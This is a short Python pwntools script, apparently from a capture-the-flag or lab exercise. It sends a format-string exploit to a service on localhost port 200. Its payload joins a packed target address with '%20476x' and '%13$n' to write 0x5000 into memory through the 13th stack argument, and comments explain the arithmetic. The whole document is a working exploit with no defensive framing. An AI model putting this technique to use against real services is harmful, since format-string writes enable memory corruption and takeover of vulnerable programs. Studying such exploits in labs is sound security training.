from pwn import *

host = "127.0.0.1" #Local host
portNum = 200 #Given in the program

targetAddress = "\xcc\xd0\x04\x08"
#To write 0x5000 in for address, 20476 is 0x5000 in dec, then minus 4.
#Then %13$n is to write to 13th element in the stack 
exploit = f"{targetAddress}" + "%20476x" + "%13$n"  
eol = b'\r\n' #To mark the end of recieve on server side
print('sending exploit: '+exploit)
io=connect(host, portNum)
io.send(exploit)
